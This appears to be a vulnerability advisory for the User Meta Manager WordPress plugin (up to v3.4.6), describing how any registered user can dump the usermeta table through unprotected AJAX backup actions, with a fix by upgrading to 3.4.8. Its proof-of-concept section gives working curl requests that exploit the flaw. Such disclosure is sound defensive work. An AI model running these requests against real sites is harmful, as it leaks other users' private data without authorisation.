## Description

User Meta Manager for WordPress plugin up to v3.4.6 suffers from a information disclosure vulnerability. Any registered user can perform an a series of AJAX
requests, in order to get all contents of `usermeta` DB table.

`usermeta` table holds additional information for all registered users. User Meta Manager plugin offers a `usermeta` table backup functionality. During the backup process the plugin takes no action in protecting the leakage of the table contents to unauthorized (non-admin) users.

## PoC

### Get as MySQL query

First a backup table must be created


curl -c ${USER_COOKIES} \
    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
    ?action=umm_switch_action&umm_sub_action=umm_backup"


Then we get the table with another request

curl -c ${USER_COOKIES} \
    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
    ?action=umm_switch_action&umm_sub_action=umm_backup&mode=sql"

### Get as CSV file

curl -c ${USER_COOKIES} \
    "http://${VULN_SITE}/wp-admin/admin-ajax.php\
    ?action=umm_switch_action&umm_sub_action=umm_get_csv"

## Solution

Upgrade to version 3.4.8
